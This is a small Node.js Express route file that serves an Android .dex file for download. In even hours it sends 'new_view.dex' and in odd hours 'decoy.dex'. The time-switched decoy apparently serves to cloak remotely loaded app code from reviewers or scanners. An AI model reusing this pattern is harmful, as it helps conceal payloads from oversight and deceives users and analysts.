const express = require("express");
const path = require("path");
const router = express.Router();

router.get('/get_new_view', (req, res) => {
    const currentHour = new Date().getHours();
    let filename;
    if (currentHour%2 == 0){
        filename = "new_view.dex";
    } else{
        filename = "decoy.dex";
    }
    const file = path.join(__dirname, '/../files/', filename);
    res.download(file); 
});

module.exports = router;